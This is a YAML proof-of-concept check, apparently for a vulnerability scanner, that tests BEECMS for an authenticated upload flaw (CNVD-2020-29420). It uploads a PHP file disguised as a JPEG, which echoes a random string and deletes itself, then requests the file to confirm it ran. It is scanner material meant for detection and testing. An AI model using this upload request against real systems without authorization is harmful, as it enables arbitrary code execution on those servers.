name: poc-yaml-beecms-cnvd-2020-29420-upload
binding: 9529ffe0-f255-4031-a832-35a415d0b412
manual: true
detail:
    author: xxtx
    links:
        - https://www.cnvd.org.cn/flaw/show/CNVD-2020-29420
        - http://cn-sec.com/archives/311436.html
    check_action: |
        need login, set `JSESSIONID` and `PHPSESSID`
    vulnerability:
        id: CT-528581
        level: critical
    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
transport: http
set:
    r1: randomLowercase(20)
    r2: randomLowercase(20)
    rboundary: randomLowercase(8)
    JSESSIONID: b"E98B1D05ADB0CAA36852AD5432073DE8"
    PHPSESSID: b"lpehak9lgtljt8es52srfdd9b5"
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /admin_pic_upload.php
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
                Cookie: JSESSIONID='{{JSESSIONID}}'; PHPSESSID='{{PHPSESSID}}'
            body: |-
                ------WebKitFormBoundary{{rboundary}}
                Content-Disposition: form-data; name="up[]"; filename="{{r1}}.php"
                Content-Type: image/jpeg

                <?php echo "{{r2}}"; unlink(__FILE__); ?>
                ------WebKitFormBoundary{{rboundary}}
                Content-Disposition: form-data; name="uppic"

                上传
                ------WebKitFormBoundary{{rboundary}}--
            follow_redirects: false
        expression: response.status == 200
        output:
            search: '"/upload/img/(?P<tmp>.+?).php".bsubmatch(response.body)'
            tmp: search["tmp"]
    r1:
        request:
            cache: true
            method: GET
            path: ^/upload/img/{{tmp}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(r2))
expression: r0() && r1()
